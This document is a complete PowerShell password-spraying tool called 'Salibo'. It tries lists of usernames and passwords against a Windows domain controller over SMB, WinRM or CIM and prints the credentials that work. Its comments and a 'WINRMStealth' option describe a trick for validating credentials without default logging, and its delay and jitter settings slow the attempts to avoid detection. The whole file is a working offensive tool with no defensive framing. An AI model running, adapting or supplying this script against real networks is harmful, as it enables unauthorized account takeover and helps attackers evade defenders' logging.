#Salibo a PowerShell password sprayer
#UserAccountControl

#WINRM logging evasion: When using a invalid port for WINRM. It will just validate credentials then fail to connect. As far as I can tell with default logging it's not logged.
#Don't even bother to point it at a valid hostname it will validate the credentials then fail to connect.

#Create parameters
param(
        [string]$u,
        [string]$p,
        [string]$dc,
        [string]$domain,
        [string]$auth = "DEFAULT",
        [string]$method = "SMB",
        [int]$delay = 0,
        [int]$jitter = 0,
        [bool]$timestamps = $false,
        [bool]$WINRMStealth = $false,
        [bool]$help = $false
     )

#Check if help is true
if($help -eq $true)
    {
        Write-Host "-u                Username or file containing usernames one per line."
        Write-Host "-p                Password or file containing passwords one per line."
        Write-Host "-dc               Domain controller to use"
        Write-Host "-domain           Domain FQDN."
        Write-Host "-method           Method to use (WINRM, SMB, CIM). Default: SMB"
        Write-Host "-auth             Authentication method to use KERBEROS, NTLMDomain (Only applies to CIM method) or DEFAULT). Default: DEFAULT"
        Write-Host "-delay            Time in seconds to delay between tries. Default: 0"
        Write-Host "-jitter           Maximum randomized delay variation (Requires delay to be set). Default: 0"
        Write-Host '-timestamps       Add timestamp to each attempt. Default: $false'
        Write-Host '-WINRMStealth     If machine is on the domain it will not try to connect to WINRM and will just validate credentials failures are not in logs. Requires auth to be set to KERBEROS on non-Domain joined machine. Default: $false'
        Write-Host
        Write-Host 'Example Usage: PasswordSpray.ps1 -u ".\users.txt" -p "P@ssword" -dc "BBL-DC" -domain "BBLABS.LOCAL" -method "CIM" -auth "KERBEROS" -timestamps $true -delay 30 -jitter 15'
        exit
    }


#Check if username or password is a filepath
$UserIsList = Test-Path -Path $u
$PasswordIsList = Test-Path -Path $p

#If user parameter if found to be a file get the contents of the file
if($UserIsList)
    {
        $users = Get-Content $u
    }
#If it's not a file just convert the single value to an array to use in foreach loop
else
    {
        $users = @($u)
    }

#If password parameter if found to be a file get the contents of the file
if($PasswordIsList)
    {
        $passwords = Get-Content $p
    }
#If it's not a file just convert the single value to an array to use in foreach loop
else
    {
        $passwords = @($p)
    }

#Try combinations

foreach($user in $users)
    {
        foreach($password in $passwords)
            {
                #Set up credential
                $username = $domain+"\"+$user
                $pass = ConvertTo-SecureString -AsPlainText $password -Force
                $Cred = [PSCredential]::new($username,$pass)
               
                #Try the credential using the specified method
                try
                    {
                        #Add a delay between tries
                        if($delay -ne 0)
                            {
                                #Apply jitter
                                if($jitter -ne 0)
                                    {
                                        #Create a random range up to the jitter value and apply to delay
                                        #Generate jitter number 
                                        $jitnum = Get-Random -Maximum $jitter -Minimum 1
                                        #Apply to the delay
                                        $jitterized = Get-Random -Maximum $delay -Minimum $jitnum
                                        Start-Sleep -Seconds $jitterized
                                    }
                                #If no jitter needed just do the delay
                                else
                                    {
                                        Start-Sleep -Seconds $delay
                                    }
                            }
                        #Add timestamps to output
                        if($timestamps -eq $true)
                            {
                                Write-Host -NoNewline (Get-Date -Format "MM/dd/yyyy HH:mm:ss")
                            }
                        #Use WINRM Method
                        if($method.ToUpper() -eq "WINRM")
                            {
                                #Clear any previous error state
                                $error.Clear()
                                #Check if WINRMStealth mode is enabled
                                if($WINRMStealth -eq $true)
                                    {
                                        Invoke-Command -ComputerName $dc -ScriptBlock {} -Credential $Cred -Authentication $auth -Port 4444 -ErrorAction Stop | Out-Null
                                    }
                                else
                                    {
                                        Invoke-Command -ComputerName $dc -ScriptBlock {} -Credential $Cred -Authentication $auth -ErrorAction Stop | Out-Null
                                    }
                            }      
                        #Use SMB Method
                        if($method.ToUpper() -eq "SMB")
                            {
                                #Clear any previous error state
                                $error.Clear()
                                New-PSDrive -Name "-" -PSProvider "FileSystem" -Root "\\$dc\C$" -Credential $Cred -ErrorAction Stop | Out-Null
                                
                                #If a PSDrive was created remove it.
                                Remove-PSDrive -Name "-"
                            }
                        #Use CIM Method
                        if($method.ToUpper() -eq "CIM")
                            {
                                #Clear any previous error state
                                $error.Clear()
                                New-CimSession -Name "-" -ComputerName $dc -Credential $Cred -Authentication $auth -ErrorAction Stop | Out-Null

                                #If a CIM session was created remove it
                                Remove-CimSession -Name "-"
                            }
                     }
                        #Catch execeptions and check for Access Denied signifiying valid credentials
                        catch
                            {
                                If($_.Exception.Message -like "*Access is Denied*")
                                    {
                                        Write-Host -ForegroundColor Green -NoNewline "[+]"
                                        Write-Host $username":"$password
                                    }
                                 if($_.Exception.Message -like "*Verify that the specified computer name is valid*")
                                    {
                                        Write-Host -ForegroundColor Green -NoNewline "[+]"
                                        Write-Host $username":"$password
                                    }
                                 if($_.Exception.Message -like "*password*")
                                    {
                                       Write-Host -NoNewline "[-]"
                                       Write-Host $username":"$password
                                    }
                            }
                        #Check if there was no error. If no error occurred it is possible to use WINRM with that account.
                        if(-not $error -and $method -eq "WINRM")
                            {
                                Write-Host -ForegroundColor Green -NoNewline "[+]"
                                Write-Host $username":"$password -NoNewline
                                Write-Host "(WINRM Capable on"$DC")"
                            }
                    
                        #Check if there was no error. If no error occurred it is possible to connect to the C drive with that account.
                        if(-not $error -and $method.ToUpper() -eq "SMB" )
                            {
                                Write-Host -ForegroundColor Green -NoNewline "[+]"
                                Write-Host $username":"$password -NoNewline
                                Write-Host "(Can connect to C drive on"$DC")"
                            }
                        #Check if there was no error. If no error occurred it is possible to create a CIM session with that account.
                        if(-not $error -and $method.ToUpper() -eq "CIM")
                            {
                                Write-Host -ForegroundColor Green -NoNewline "[+]"
                                Write-Host $username":"$password -NoNewline
                                Write-Host "(CIM Session can be created on"$DC")"
                            }

                    }
            }
    
